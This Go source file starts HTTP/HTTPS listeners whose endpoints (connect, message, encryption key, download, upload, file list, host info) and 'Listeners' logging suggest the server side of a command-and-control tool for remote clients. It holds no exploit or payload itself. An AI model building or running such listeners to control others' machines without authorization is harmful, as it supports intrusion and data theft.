package protocol

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"time"
	"strings"
    "sync"
)
var (
    serverMap = make(map[string]*http.Server)
    mutex     sync.Mutex
)
type Handler interface {
    Index(conn, Get_Msg,switch_key,encry_key,download,result,net,info,upload,list,option,uid,username,hostname,keyPart,filekey string) http.HandlerFunc
}
type Putserver interface {
    PutServer(port, path, connPath, msgPath,switch_key,encry_key,download,result,net,info,upload,list,option,protocol,username,remark,cert, key,uid,hostname,keyPart,filekey string, clients int) bool
}
type WLog interface{
    WriteLog(logStr string)
}
func Http_server(handler Handler, ServerManager Putserver, writeLog WLog,
    port, path, conn_path, GetMsg,switch_key,encry_key,download,result,net,info,upload,list,option,
    protocol,uid,user,hostname,keyPart,filekey,remark,defaultCert, defaultKey, certPEM, keyPEM string) {
    var err error
    var returnStr string

    // 确保 path 以 "/" 开头
    if !strings.HasPrefix(path, "/") {
        path = "/" + path
    }

    mux := http.NewServeMux()
    mux.HandleFunc(path, func(w http.ResponseWriter, r *http.Request) {
        w.Header().Set("Connection", "keep-alive")
        handler.Index(conn_path, GetMsg,switch_key,encry_key,download,result,net,info,upload,list,option,uid,user,hostname,keyPart,filekey).ServeHTTP(w, r)
    })

    if protocol == "http" {
        server := &http.Server{
            Addr:         ":" + port,
            Handler:      mux,
            IdleTimeout:  0,
            ReadTimeout:  30 * time.Second,
            WriteTimeout: 30 * time.Second,
        }

        serverMap[port] = server

        current := time.Now()
        formattedTime := current.Format("2006.01.02 15:04")
        returnStr = fmt.Sprintf("%v [*] Start HTTP server successful, access address :%s%s,Listeners_path:%s,Msg_path:%s,switch_path:%s,key_path:%s,download_path:%s,result_path:%s,net_path:%s,info_path:%s,upload_path:%s,list_path:%s,option:%s\n",
        formattedTime, port, path,conn_path,GetMsg,switch_key,encry_key,download,result,net,info,upload,list,option)
        writeLog.WriteLog(returnStr)

        // cert/key传nil
        ServerManager.PutServer(port, path, conn_path, GetMsg, switch_key, encry_key, download, result, net, info, upload, list, option, protocol, user, remark,"null","null",uid,hostname,keyPart,filekey,0)

        err = server.ListenAndServe()
        if err != nil {
            returnStr = fmt.Sprintf("FAIL TO START HTTP SERVER: %v\n", err)
            writeLog.WriteLog(returnStr)
        }

    } else if protocol == "https" {
        var cert tls.Certificate
        var cert_g, key_g string
        if certPEM != "" && keyPEM != "" {
            cert, err = tls.X509KeyPair([]byte(certPEM), []byte(keyPEM))
            if err != nil {
                returnStr = fmt.Sprintf("[*] Failed to parse provided cert or key: %v\n", err)
                writeLog.WriteLog(returnStr)
                return
            }
            //获取组织
            cert_g, key_g = certPEM, keyPEM
            if err != nil {
                returnStr = fmt.Sprintf("[*] Failed to load provided cert or key: %v\n", err)
                writeLog.WriteLog(returnStr)
                return
            }
            returnStr = "[*] Using provided certificate and key\n"
            writeLog.WriteLog(returnStr)
        } else {
            cert, err = tls.X509KeyPair([]byte(defaultCert), []byte(defaultKey))
            if err != nil {
                returnStr = fmt.Sprintf("[*] Failed to parse default cert or key: %v\n", err)
                writeLog.WriteLog(returnStr)
                return
            }
            //获取组织
            cert_g, key_g = "defaultCert", "defaultKey"
            returnStr = "[*] Using default certificate and key\n"
            writeLog.WriteLog(returnStr)
        }

        tlsConfig := &tls.Config{
            MinVersion:         tls.VersionTLS12,
            GetCertificate:     func(chi *tls.ClientHelloInfo) (*tls.Certificate, error) { return &cert, nil },
            ClientAuth:         tls.NoClientCert,
            InsecureSkipVerify: true,
        }

        server := &http.Server{
            Addr:         ":" + port,
            Handler:      mux,
            IdleTimeout:  0,
            ReadTimeout:  30 * time.Second,
            WriteTimeout: 30 * time.Second,
            TLSConfig:    tlsConfig,
        }
        serverMap[port] = server
        current := time.Now()
        formattedTime := current.Format("2006.01.02 15:04")
        returnStr = fmt.Sprintf("%v [*] Start HTTPS server successful, access address :%s%s,Listeners_path:%s,Msg_path:%s,switch_path:%s,key_path:%s,download_path:%s,result_path:%s,net_path:%s,info_path:%s,upload_path:%s,list_path:%s,option:%s\n",
        formattedTime, port, path,conn_path,GetMsg,switch_key,encry_key,download,result,net,info,upload,list,option)
        writeLog.WriteLog(returnStr)

        ServerManager.PutServer(port,path,conn_path,GetMsg,switch_key,encry_key,download,result,net,info,upload,list,option,protocol,user,remark,cert_g,key_g,uid,hostname,keyPart,filekey,0)

        err = server.ListenAndServeTLS("", "")
        if err != nil {
            returnStr = fmt.Sprintf("FAIL TO START HTTPS SERVER: %v\n", err)
            writeLog.WriteLog(returnStr)
        }
    }
}
// 关闭服务器
func StopServer(port string) {
	mutex.Lock()
	defer mutex.Unlock()
	if server, exists := serverMap[port]; exists {
		server.Close()
		delete(serverMap, port)
	}
}
